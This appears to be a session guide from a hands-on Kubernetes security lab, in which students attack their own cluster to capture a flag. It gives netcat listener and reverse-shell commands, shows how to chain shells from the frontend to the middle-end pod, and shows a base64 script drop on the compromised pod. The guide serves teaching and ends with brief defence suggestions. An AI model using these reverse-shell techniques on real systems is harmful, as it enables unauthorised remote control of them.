# Session 3

The goal of this session is to attack your Kubernetes cluster, and reach the backend service.

## Understanding the netcat tool:

First, you will work with the netcat tool in local. In your terminal, try the command:
```bash
nc -lvp 4444
```
Then try the command:
```bash
nc localhost 4444 -e /bin/sh
```
You need to install the `ncat` package to be able to use the `-e` option. To do so, run the following commands:
```bash
sudo apt remove netcat-openbsd

sudo apt install ncat
```
The netcat tool will be used to attack the cluster. Using netcat commands, a reverse shell can be created. A reverse shell gives access to the attacked machine the following way:

- Attacker listens to a netcat connection on their machine using `nc -lvp <port_number>`.
- Attacker uses a vulnerability of target machine to have it use a netcat command to start a connection.
- Target starts a connection to attacker's machine, and also launches a shell: Attacker now has access to target machine, and every data sent by attacker is parsed as if it is a shell command on target machine.

This method's goal is to bypass firewalls by having the server itself start the connection, and hoping the firewall will only check for unwanted connections from outside. The commands that can be used to create reverse shells using netcat are listed on many cheatsheets on internet. Among them is [this](https://gabb4r.gitbook.io/oscp-notes/shell/bind-and-reverse-shell) cheatsheet.  

In the previous cheatsheet, read the "Bind and Reverse shell" part, and then the "Upgrading your shell" part. The first one explains how to get a reverse shell, and the second explains how to have a responsive shell. 

First, try to have a reverse shell between two terminals. Then try to chain them between three terminals: 

- In a first terminal, use the command `nc -lvp 4444`
- In a second terminal, use the command `nc localhost 4444 -e /bin/sh`
- Upgrade your shell in the first terminal
- In the first terminal, use the command `nc -lvp 4445`
- In a third terminal, use the command `nc localhost 4445 -e /bin/sh`
- Upgrade the shell again

You should now have a shell going to the third terminal from the first, through the second terminal. Chaining the shells will be needed, as because of network rules, only frontend and backend can reach middle-end server.

## Attacking the frontend server

In order to attack your frontend, you have to listen on a terminal on your machine, and then launch a connection from the frontend. You can do so using the commands explained in the cheatsheet and in the previous part.  
After you've taken control of the frontend, give it access to internet. To do so, you can use the following command:
```bash
echo "nameserver 8.8.8.8" | tee -a /etc/resolv.conf > /dev/null
```
This command adds Google's nameserver in the configuration of the frontend container, which will allow you to use URLs.  
Now, you can try and install different libraries. Recommended are `curl` and `nmap`. The first one allows you to easily make HTTP requests, and the second one allows to scan the network. To add a library, use the command:
```bash
apk add <library_name>
```
You are now able to do whatever you want with the frontend.

## Attacking the middle-end server

To take control of the middle-end server, you need to chain the terminals. Knowing that `curl` can be used to send HTTP requests, try chaining the reverse shells to take control of the middle-end microservice. To check whether you have control or not, in your master1 node, get the IP addresses of the pods by running the command:
```bash
kubectl get pods -o wide
```

Then, in your terminal (in your machine), check which pod you have control of using:
```bash
ip a
```

## Getting the flag

Even though you have taken control of middle-end, you cannot install any tools on it because of network rules. To be able to get the flag, you can use a python to launch a command. The script should send the required HTTP request to the target server to get the flag. To send the python script to the middle-end, the easiest way is to write the script on your machine, then encode it in base64, get the encoded string, then write it like that:

```bash
echo "<encoded_string>" | base64 -d | tee send_nc_command.py >/dev/null
```

Then you can run the script, and you should get the flag.


## How to protect

There are several ways you could use to protect your cluster:

- Using Web Application Firewalls (WAF) to filter suspicious HTTP calls
- Using a SIEM (Security Information and Event Management) to detect abnormal behaviors  

## To go further

<details> 
  <summary>Complexifying the setup</summary> 

In another [namespace](https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces/), try to deploy the same setup, but with more middle-end servers. For example, you can try to have a frontend, linked to a first microservice, which is linked to another microservice, which itself leads to the backend. In terms of architecture, this could for example be the case of having a webpage which when queried goes through an API gateway (for authorization purposes), then goes to an API server, and finally reaches the database.  
Once this is done, try attacking this setup. You will now need to also write scripts to send the requests for the attacks.


</details>  